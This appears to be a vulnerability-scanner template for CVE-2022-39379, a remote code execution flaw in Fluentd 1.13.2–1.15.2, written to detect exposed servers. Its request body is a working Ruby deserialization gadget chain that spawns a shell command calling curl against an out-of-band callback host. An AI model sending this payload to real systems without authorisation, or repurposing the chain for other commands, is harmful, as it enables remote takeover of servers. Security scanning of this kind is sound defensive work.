id: CVE-2022-39379

info:
  name: Fluentd between version >= 1.13.2 & <= 1.15.2 RCE
  author: dwisiswant0
  severity: critical
  description: |
    A remote code execution (RCE) vulnerability in non-default
    configurations of Fluentd allowed unauthenticated attackers
    to execute arbitrary code via specially crafted JSON payloads.
  reference:
    - https://securitylab.github.com/advisories/GHSL-2022-067_Fluentd/
    - https://github.com/fluent/fluentd/security/advisories/GHSA-fppq-mj76-fpj2
    - https://nvd.nist.gov/vuln/detail/CVE-2022-39379
  tags: cve,cve2022,fluentd,rce

variables:
  txt_alpha: "{{rand_text_alpha(12)}}"
  b64_alpha: "{{base64(txt_alpha)}}"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/debug.test"
      - "{{BaseURL}}:8888/debug.test"
    body: |
      {
        "^#1": [
          [
            {
              "^c": "Gem::SpecFetcher"
            },
            {
              "^c": "Gem::Installer"
            },
            {
              "^o": "Gem::Requirement",
              "requirements": {
                "^o": "Gem::Package::TarReader",
                "io": {
                  "^o": "Net::BufferedIO",
                  "io": {
                    "^o": "Gem::Package::TarReader::Entry",
                    "read": 0,
                    "header": "any"
                  },
                  "debug_output": {
                    "^o": "Net::WriteAdapter",
                    "socket": {
                      "^o": "Gem::RequestSet",
                      "sets": {
                        "^o": "Net::WriteAdapter",
                        "socket": {
                          "^c": "Kernel"
                        },
                        "method_id": ":spawn"
                      },
                      "git_set": "curl -so /dev/null http://{{interactsh-url}}/$(base64 -d <<< {{b64_alpha}})"
                    },
                    "method_id": ":resolve"
                  }
                }
              }
            }
          ],
          "any"
        ]
      }

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "{{txt_alpha}}"

      - type: word
        part: header
        words:
          - "text/plain"